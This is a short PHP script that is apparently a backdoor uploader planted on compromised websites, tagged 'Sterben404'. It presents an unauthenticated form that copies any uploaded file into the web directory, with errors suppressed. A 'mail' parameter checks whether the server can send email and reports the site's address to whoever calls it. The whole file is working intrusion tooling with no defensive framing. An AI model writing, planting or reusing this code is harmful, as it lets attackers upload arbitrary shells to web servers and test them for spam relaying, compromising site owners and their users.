<form action='' method='post' enctype='multipart/form-data' name='uploader' id='uploader'>
	<input type='file' name='file' size='50'>
	<input name='_upl' type='submit' id='_upl' value='Sterben404'>
</form>
<?php
if (isset($_GET['mail'])) {
	$mail = $_GET['mail'];
	if (mail($mail,$_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'],"MAILER TESTED BY STERBEN404")){
		echo("Mail Send --> ".$mail."!!"); 
	}
	else { 
		echo("Not support for mailer");
	}
};
if(isset($_POST['_upl'])){
	if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name']));
}
?>
